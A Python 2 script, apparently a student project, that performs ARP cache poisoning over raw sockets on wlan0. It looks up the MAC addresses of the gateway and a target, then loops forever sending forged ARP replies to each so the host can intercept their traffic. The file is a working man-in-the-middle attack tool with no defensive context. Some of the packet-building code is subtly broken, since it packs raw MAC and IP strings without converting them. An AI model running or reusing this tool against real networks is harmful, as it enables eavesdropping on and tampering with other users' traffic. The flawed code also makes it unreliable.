import socket #used to  provides access to the socket interface.
import struct 
import commands
import time 
import Project 


#the "main" function that get all the ip and mac and calls other functuin that send the requset and the replise
def Posion(trg):

    #the sending socket
    ether_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.SOCK_RAW)# the sending socket
    ether_socket.bind(("wlan0",socket.SOCK_RAW)) #bing to the corrct interface

    #gateway
    GW_IP=Project.GETGATWAY() 
    GW_MAC= ARPQ(GW_IP)   
    
    #target
    TRG_IP=trg
    TRG_MAC= ARPQ(trg)
    
    while 1:
            ether_socket.send(ARPR(TRG_IP,TRG_MAC,GW_IP)) #posion the target
            ether_socket.send(ARPR(GW_IP, GW_MAC,TRG_IP))# posiong the getway
            time.sleep(1) # delays for 0.5 seconds
            print "Poisoning"

#funcion that crates a Replay ARP packet and returns it    
def ARPR(trgIP , trgMAC , IPANS): 
    
    #the host 
    ether_add = GETAMAC() #Host MAC
    ip_add = GETIP() #Host IP
    
    #Ether
    target_mac=struct.pack('!6s', trgMAC.replace(':','').decode('hex')) 
    my_mac=struct.pack('!6s', ether_add.replace(':','').decode('hex'))
    proto_type=struct.pack('!H',0x0806)# arp ether type
    Ether=  target_mac +my_mac +  proto_type
    
    #ARP
    arp_hdr = struct.pack("!2s2s1s1s2s", '\x00\x01', '\x08\x00', '\x06', '\x04', '\x00\x02') #Hardware type (mac), Protocol type (IP),Hardware length(6) , Protocol length(4),Operation  (2=reply) 
    arp_sender = struct.pack("!6s4s", ether_add.replace(':','').decode('hex'), socket.inet_aton(IPANS))
    arp_target = struct.pack("!6s4s", trgMAC, trgIP)
    arp=arp_hdr+arp_sender+arp_target
    
    return Ether +arp #returns the packet
        

#function that askes an arp request and return the mac of a host    
def ARPQ(trg):
    #the receiving and sending sockets
    ether_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.SOCK_RAW)# the sending socket
    ether_socket.bind(("wlan0",socket.SOCK_RAW)) #bing to the corrct interface.

    ether_add = GETAMAC()
    ip_add = GETIP() 
       
    #Ether
    bcast_mac=struct.pack('!6B',*(0xff,)*6)
    my_mac=struct.pack('!6s', ether_add.replace(':','').decode('hex'))
    proto_type=struct.pack('!H',0x0806)
    Ether=  bcast_mac +my_mac +  proto_type
    
    #ARP
    arp_hdr = struct.pack("!2s2s1s1s2s", '\x00\x01', '\x08\x00', '\x06', '\x04', '\x00\x01')  
    arp_sender = struct.pack("!6s4s", ether_add.replace(':','').decode('hex'), socket.inet_aton(ip_add))
    arp_target = struct.pack("!6s4s", '\x00\x00\x00\x00\x00\x00', socket.inet_aton(trg))
    arp=arp_hdr+arp_sender+arp_target
    
    ether_socket.send(Ether +arp)#sending the requst 
    print "sent arp how is :"+trg
    rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    
    while 1: 
        response = rawSocket.recvfrom(2048)
       
        trgres = socket.inet_ntoa(response[0][28:32])#if we get a packet back from the ip we sent to... that means that he is alive!!! 
        if trg == trgres:
            print "is at "+MACaddresPasrser(response[0][22:28])
            return MACaddresPasrser(response[0][22:28])# the mac addrees of the ip we asked  
		
           
#function that returns the MAC address of the host    
def GETAMAC():
    words = commands.getoutput("ifconfig " + "wlan0").split()
    return words[ words.index("HWaddr") + 1 ]

#function that return the ip of the host 
def GETIP():
    words = commands.getoutput("ifconfig " + "wlan0").split("wlan0")
    words=words[1]
    words=words.split()
    words= words[ words.index("inet") + 1 ]
    words=words[5:]
    return words


#functuin that gets the hex value of mac address and prints it in  xx:xx:xx:xx:xx 
def MACaddresPasrser(addr):
    return  "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(addr[0]) , ord(addr[1]) , ord(addr[2]), ord(addr[3]), ord(addr[4]) , ord(addr[5]))    
    
